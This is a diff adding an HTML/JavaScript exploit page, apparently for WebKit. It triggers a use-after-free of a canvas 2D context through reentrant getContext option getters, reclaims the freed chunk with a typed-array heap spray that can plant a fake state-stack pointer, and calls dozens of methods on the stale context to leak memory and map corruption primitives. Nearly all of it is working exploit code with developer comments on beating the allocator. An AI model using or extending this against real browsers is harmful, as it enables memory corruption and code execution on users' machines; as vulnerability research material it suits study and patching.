@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<meta charset="utf-8">
+<title>uaf-spray: reclaim the freed context, no logging in between</title>
+<!--
+  #15 chunk reclaim, avoiding the one allocation that used to beat the spray:
+  a console message after the free makes the inspector build a script call
+  stack (Vector<ScriptCallFrame>, 584 bytes) inside fastMalloc, which lands in
+  the freshly freed CanvasRenderingContext2D.
+
+  So this page does not log anything between the trigger and the use.  Results
+  are buffered and reported through document.title, which the harness prints
+  as "TITLE: ...".
+
+  qs: size=584 n=64 fill=marker|zero op=canvas|fillRect|lineWidth|none
+      ticks=0 (same task) | n>0 (defer the spray by n task turns)
+      set=<off>:<value>[;...]  qwords written into every sprayed buffer
+                               (value in hex with 0x, or decimal)
+      sbuf=<addr>              shorthand for the fake state stack:
+                               set=72:<addr>;80:1;84:1;560:0
+-->
+<script>
+const qs = new URLSearchParams(location.search);
+const SIZE = Number(qs.get("size") || 584);
+const N = Number(qs.get("n") || 64);
+const TICKS = Number(qs.get("ticks") || 0);
+const OP = qs.get("op") || "canvas";
+const FILL = qs.get("fill") || "marker";
+// Zero the tracer flag in the last sprayed buffer (the one that tends to win
+// the freed chunk) so 2D calls do not divert into the inspector.
+const Z16 = Number(qs.get("z16") || 0);
+const DELAY = Number(qs.get("delay") || 0);
+
+// qword overrides: "72:0x7f00...;80:1;84:1".  Parsed once and applied to
+// every sprayed buffer, because the chunk winner is not stable across runs.
+const SET = new Map();
+function parseVal(v) { return BigInt(v); }
+for (const item of (qs.get("set") || "").split(";")) {
+  if (!item) continue;
+  const k = item.indexOf(":");
+  if (k < 0) continue;
+  SET.set(Number(item.slice(0, k)), parseVal(item.slice(k + 1)));
+}
+const SBUF = qs.get("sbuf");
+if (SBUF) {
+  SET.set(72, parseVal(SBUF));
+  SET.set(80, 1n);   // m_capacity
+  SET.set(84, 1n);   // m_size, so Vector::last() passes
+  SET.set(560, 0n);  // m_unrealizedSaveCount, so realizeSaves() is a no-op
+}
+
+let notes = [];
+function note(m) { notes.push(m); }
+
+// Exact bit pattern of a number the stale context handed back.  A memory
+// qword re-read as a double survives this unless it is a NaN (and the values
+// we target -- subnormal pointers, ELF headers -- are not).
+function bits(x) {
+  const f = new Float64Array(1);
+  f[0] = x;
+  return "0x" + new BigUint64Array(f.buffer)[0].toString(16).padStart(16, "0");
+}
+
+const canvas = document.createElement("canvas");
+canvas.width = 64;
+canvas.height = 64;
+
+// Small source bitmap for drawImage/createPattern; allocated before the
+// trigger so those calls only touch the stale context.
+const src = document.createElement("canvas");
+src.width = 8;
+src.height = 8;
+
+let stale = null;
+let liveCanvas = null;
+let reentered = false;
+function reenter() {
+  if (reentered)
+    return;
+  reentered = true;
+  stale = canvas.getContext("2d");
+}
+
+function trigger() {
+  canvas.getContext("2d", {
+    get desynchronized() { reenter(); return false; },
+    get willReadFrequently() { reenter(); return false; },
+    get alpha() { reenter(); return true; },
+    get colorSpace() { reenter(); return "srgb"; }
+  });
+}
+
+let spray = [];
+
+function sprayNow() {
+  for (let i = 0; i < N; ++i) {
+    const a = new Uint8Array(SIZE);
+    if (FILL === "marker") {
+      const dv = new DataView(a.buffer);
+      for (let off = 0; off + 8 <= SIZE; off += 8)
+        dv.setBigUint64(off, 0x4141414100000000n + (BigInt(i) << 8n) + BigInt(off >> 3), true);
+    } else if (FILL === "ones") {
+      a.fill(0x41);
+    } else if (FILL === "vt") {
+      // Zero everything except the vptr, so any virtual call on the stale
+      // object jumps to a marker address instead of running real code.
+      a.fill(0);
+      new DataView(a.buffer).setBigUint64(0, 0x4141414100004141n, true);
+    } else if (FILL === "offset") {
+      // Self-describing qwords: base 0x4141414100004141, bits 16.. hold the
+      // byte offset, low 16 bits carry off>>3 as a checksum.  Code that
+      // adjusts the value by a small constant (WebKit does -0x68 before one
+      // call) does not disturb the offset field, so a fault address of the
+      // form 0x41414141........<off> names the field that was read.
+      const dv = new DataView(a.buffer);
+      for (let off = 0; off + 8 <= SIZE; off += 8)
+        dv.setBigUint64(off, 0x4141414100004141n + (BigInt(off) << 16n) + BigInt(off >> 3), true);
+    }
+    spray.push(a);
+  }
+  window.__spray = spray;
+  if (SET.size) {
+    for (const a of spray) {
+      const dv = new DataView(a.buffer);
+      for (const [off, val] of SET) dv.setBigUint64(off, val, true);
+    }
+  }
+  // With the inspector tracer flag clear, the 2D calls skip enabledCanvasAgent
+  // and reach their own implementation, which is what we want to map.
+  if (Z16) {
+    for (const a of spray) new DataView(a.buffer).setBigUint64(16, 0n, true);
+  }
+  note("sprayed " + spray.length + " x " + SIZE + " fill=" + FILL);
+}
+
+function use() {
+  if (!stale || OP === "none") {
+    note("end");
+    return;
+  }
+  let out = "";
+  try {
+    switch (OP) {
+      case "selfcheck": {
+        const dv = new DataView(spray[spray.length - 1].buffer);
+        out = "n=" + spray.length + " set=" + SET.size
+            + " q16=" + dv.getBigUint64(16, true).toString(16)
+            + " q24=" + dv.getBigUint64(24, true).toString(16)
+            + " q72=" + dv.getBigUint64(72, true).toString(16)
+            + " q84=" + dv.getBigUint64(84, true).toString(16);
+        break;
+      }
+      case "canvas": out = "width=" + stale.canvas.width; break;
+      case "fillRect": stale.fillRect(0, 0, 1, 1); out = "ok"; break;
+      case "clearRect": stale.clearRect(0, 0, 1, 1); out = "ok"; break;
+      case "lineWidthGet": out = "lw=" + bits(stale.lineWidth); break;
+      case "lineWidth": stale.lineWidth = 3.25; out = "set"; break;
+      case "globalAlphaGet": out = "ga=" + bits(stale.globalAlpha); break;
+      case "globalAlpha": stale.globalAlpha = 0.5; out = "set"; break;
+      case "fontGet": out = "font=" + stale.font; break;
+      case "font": stale.font = "12px sans-serif"; out = "set"; break;
+      case "save": stale.save(); out = "ok"; break;
+      case "restore": stale.restore(); out = "ok"; break;
+      case "getContextAttributes": out = "attrs=" + JSON.stringify(stale.getContextAttributes()); break;
+      case "getImageData": out = "px=" + stale.getImageData(0, 0, 1, 1).data.length; break;
+      case "createImageData": out = "px=" + stale.createImageData(1, 1).data.length; break;
+      case "drawImage": stale.drawImage(src, 0, 0); out = "ok"; break;
+      case "measureText": out = "w=" + stale.measureText("x").width; break;
+      case "fillText": stale.fillText("x", 0, 0); out = "ok"; break;
+      case "strokeText": stale.strokeText("x", 0, 0); out = "ok"; break;
+      case "gcoGet": out = "gco=" + stale.globalCompositeOperation; break;
+      case "globalCompositeOperation": stale.globalCompositeOperation = "copy"; out = "set"; break;
+      case "setTransform": stale.setTransform(1, 0, 0, 1, 0, 0); out = "ok"; break;
+      case "getTransform": out = "ok=" + bits(stale.getTransform().a); break;
+      case "resetTransform": stale.resetTransform(); out = "ok"; break;
+      case "transform": stale.transform(1, 0, 0, 1, 0, 0); out = "ok"; break;
+      case "translate": stale.translate(1, 1); out = "ok"; break;
+      case "scale": stale.scale(2, 2); out = "ok"; break;
+      case "rotate": stale.rotate(0.5); out = "ok"; break;
+      case "arc": stale.arc(1, 1, 1, 0, 1); out = "ok"; break;
+      case "ellipse": stale.ellipse(1, 1, 1, 1, 0, 0, 1); out = "ok"; break;
+      case "beginPath": stale.beginPath(); out = "ok"; break;
+      case "fill": stale.fill(); out = "ok"; break;
+      case "stroke": stale.stroke(); out = "ok"; break;
+      case "clip": stale.clip(); out = "ok"; break;
+      case "isPointInPath": out = "in=" + stale.isPointInPath(1, 1); break;
+      case "isPointInStroke": out = "in=" + stale.isPointInStroke(1, 1); break;
+      case "shadowBlurGet": out = "sb=" + bits(stale.shadowBlur); break;
+      case "shadowBlur": stale.shadowBlur = 2; out = "set"; break;
+      case "lineDashGet": out = "ld=" + stale.getLineDash().length; break;
+      case "setLineDash": stale.setLineDash([1, 2]); out = "ok"; break;
+      case "lineDashOffset": stale.lineDashOffset = 1; out = "set"; break;
+      case "createLinearGradient": out = "ok=" + !!stale.createLinearGradient(0, 0, 1, 1); break;
+      case "createPattern": out = "ok=" + !!stale.createPattern(src, "repeat"); break;
+      case "filter": stale.filter = "blur(1px)"; out = "set"; break;
+      case "textAlign": stale.textAlign = "center"; out = "set"; break;
+      case "textAlignRW": {
+        stale.textAlign = "center";
+        out = "wrote then read " + stale.textAlign;
+        break;
+      }
+      case "lineWidthRW": {
+        stale.lineWidth = 3.25;
+        out = "wrote then read " + bits(stale.lineWidth);
+        break;
+      }
+      case "lineWidthLiveRW": {
+        // Two setLineWidth() calls with different receivers: first a live
+        // context (so a debugger can read its CanvasBase out of field 24),
+        // then the stale one, whose m_canvas the debugger copies in.  With a
+        // real CanvasBase the write is followed by the full drawingContext()
+        // path, i.e. GraphicsContext::setStrokeThickness on a live context.
+        liveCanvas = document.createElement("canvas");
+        const live = liveCanvas.getContext("2d");
+        live.lineWidth = 2.5;
+        note("live setLineWidth done");
+        stale.lineWidth = 3.25;
+        out = "wrote then read " + bits(stale.lineWidth);
+        break;
+      }
+      case "imageSmoothing": stale.imageSmoothingEnabled = false; out = "set"; break;
+      case "direction": stale.direction = "rtl"; out = "set"; break;
+      case "reset": stale.reset(); out = "ok"; break;
+      case "closePath": stale.closePath(); out = "ok"; break;
+      case "rect": stale.rect(0, 0, 1, 1); out = "ok"; break;
+      case "roundRect": stale.roundRect(0, 0, 1, 1); out = "ok"; break;
+      case "canvasElementRead": out = "tag=" + stale.canvas.tagName; break;
+      default: out = "unknown op"; break;
+    }
+  } catch (e) {
+    out = "threw " + e;
+  }
+  note("op " + OP + " -> " + out);
+  note("end");
+}
+
+function report() {
+  document.title = (stale ? "stale=ctx " : "stale=null ") + notes.join(" | ");
+}
+
+// delay=<ms> runs the whole trigger/spray/use sequence later, so a debugger
+// can attach to the web process first.  Everything still happens inside one
+// task, which the reclaim depends on.
+function go() {
+  trigger();
+  if (!stale)
+    note("no stale wrapper");
+  sprayNow();
+
+  if (TICKS > 0) {
+    let left = TICKS;
+    (function tick() {
+      if (--left > 0) { setTimeout(tick, 0); return; }
+      use();
+      report();
+    })();
+  } else {
+    use();
+    report();
+  }
+}
+
+if (DELAY > 0)
+  setTimeout(go, DELAY);
+else
+  go();
+</script>
